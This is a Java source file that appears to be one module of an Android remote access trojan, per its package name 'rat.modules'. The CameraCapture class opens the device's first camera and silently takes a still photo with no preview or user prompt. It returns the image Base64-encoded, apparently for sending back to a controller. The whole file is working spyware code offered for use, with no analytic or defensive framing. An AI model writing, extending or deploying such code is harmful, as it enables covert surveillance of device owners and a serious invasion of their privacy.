package com.xroomjx.rat.modules;

import android.content.Context;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.media.ImageReader;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.Base64;
import android.graphics.ImageFormat;
import android.media.Image;

import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;

public class CameraCapture {
    public static String capture(Context context) {
        try {
            CameraManager manager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
            String cameraId = manager.getCameraIdList()[0];

            HandlerThread thread = new HandlerThread("camera");
            thread.start();
            Handler handler = new Handler(thread.getLooper());

            ImageReader reader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 1);

            manager.openCamera(cameraId, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(CameraDevice camera) {
                    try {
                        camera.createCaptureSession(
                            java.util.Collections.singletonList(reader.getSurface()),
                            new CameraCaptureSession.StateCallback() {
                                @Override
                                public void onConfigured(CameraCaptureSession session) {
                                    try {
                                        CaptureRequest.Builder builder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                                        builder.addTarget(reader.getSurface());
                                        session.capture(builder.build(), null, handler);
                                    } catch (Exception e) {}
                                }
                                @Override
                                public void onConfigureFailed(CameraCaptureSession session) {}
                            }, handler);
                    } catch (Exception e) {}
                }
                @Override
                public void onDisconnected(CameraDevice camera) {}
                @Override
                public void onError(CameraDevice camera, int error) {}
            }, handler);

            Thread.sleep(1000);
            Image image = reader.acquireLatestImage();
            if (image != null) {
                ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                byte[] bytes = new byte[buffer.remaining()];
                buffer.get(bytes);
                image.close();
                return Base64.encodeToString(bytes, Base64.NO_WRAP);
            }
            return "capture_failed";
        } catch (Exception e) {
            return "error: " + e.getMessage();
        }
    }
}
